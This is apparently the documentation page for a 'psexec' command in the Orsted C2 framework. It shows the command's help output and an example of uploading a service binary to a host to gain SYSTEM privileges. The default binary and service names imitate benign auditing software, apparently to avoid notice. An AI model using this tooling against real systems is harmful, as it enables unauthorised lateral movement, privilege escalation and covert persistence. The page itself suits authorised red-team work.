---

title: psexec
descripton: orsted c2 psexec
---

### General

`psexec` allows you to psexec.

```
[Session 11: haroun@DESKTOP-DU89UIV] » psexec --help

PsExec a binary on a host

Usage:
  psexec [flags] hostname file [args...]

Args:
  hostname  string         Target host - ex. 127.0.0.1, machine1
  file      string         Service file to load
  args      string list    Argument of the Assembly

Flags:
  -b, --binpath     string    Path of the binary on the remote machine - make sure it is a windows service - no spaces (default: C:\Windows\performance_audit.exe)
  -h, --help                  display help
  -d, --servicedesc string    Description of the service no spaces (default: Service_used_to_audit_performance_of_the_application.)
  -s, --servicename string    Name of the service no spaces (default: auditorsvc)
```

It requires you to load the `psexec` dll with `load-module psexec`

Basically, it will take `file` upload it to `hostname\binpath` and create a service.

The file must be a service.

For example, to become system with `psexec`

```powershell
[Session 11: haroun@DESKTOP-DU89UIV] » psexec 127.0.0.1 main_http_svc.exe
```

PS: An issue I am too lazy to fix is that service description and service name cannot have space ...

